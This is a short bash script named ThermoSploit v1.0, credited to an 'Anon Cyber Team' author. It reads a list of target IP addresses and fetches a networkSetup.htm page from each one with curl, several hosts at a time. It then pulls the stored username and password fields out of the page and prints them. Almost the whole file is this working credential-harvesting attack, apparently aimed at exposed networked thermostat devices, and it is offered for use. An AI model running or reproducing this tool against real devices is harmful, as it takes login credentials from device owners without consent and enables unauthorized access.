#!/bin/bash

# ThermoSploit v1.0
# Release on 20/01/2019
# Github: github.com/aryanrtm/ThermoSploit
# © Copyright ~ 4WSec

# color
PP='\033[95m' # purple
CY='\033[96m' # cyan
BL='\033[94m' # blue
GR='\033[92m' # green
YW='\033[93m' # yellow
RD='\033[91m' # red
NT='\033[97m'  # netral
BR='\033[33m'
O='\e[0m' # nothing
B='\e[5m' # blink
U='\e[4m' # underline

clear

# Ratio
p0rt=8008
con=2
threads=10

function depen(){
	command -v curl > /dev/null 2>&1 || { printf "\t ${YW}cURL ${NT}.......... ${RD}[✘]\n"; exit 1; }
}


function banner(){
	printf "${YW}
\t  (
\t   )
\t  ${BR}[]___   ${CY}[ ThermoSploit v1.0 ]${BR}
\t /    /\ 
\t/____/__\  ${CY}Author : ${RD}4WSec${BR}
\t|[][]||||  ${CY}Team   : ${RD}Anon Cyber Team${CY}

"
}


function get_usernpass(){
	local pler=$(curl -s -L $iP/networkSetup.htm -w %{http_code} --connect-timeout 5)
	local get_user=$(echo $pler | grep -Po '(?<=maxlength="16" value=")[^"]*')
	local get_pass=$(echo $pler | grep -Po '(?<=name="usps" value=")[^"]*')
	if [[ $pler == 408 ]] || [[ $pler == 404 ]] || [[ $pler =~ 'Not Found' ]]; then
		printf " ${RD}[✘] ${CY}U/P Not Found On IP ~> $iP \n"
	else
		echo ""
		printf " ${BR}..................................... \n"
		printf " ${CY}[☀] ${BL}Target IP : ${RD}$iP \n"
		printf " ${CY}[☀] ${BL}Username  : ${RD}$get_user \n"
		printf " ${CY}[☀] ${BL}password  : ${RD}$get_pass \n"
		printf " ${BR}..................................... \n"
		echo ""
	fi
}


function get_ip(){
	for iP in $(cat $ip_thermo); do
		local fast=$(expr $con % $threads)
		if [[ $fast == 0 && $con > 0 ]]; then
			sleep 2
		fi
		get_usernpass &
		con=$[$con+1]
	done
	wait
}

depen
banner
read -p " Enter IP List: " ip_thermo;
if [[ ! -e $ip_thermo ]]; then
	printf " ${RD}[✘] ${CY}File Not Found. \n"
	exit 1
fi
get_ip
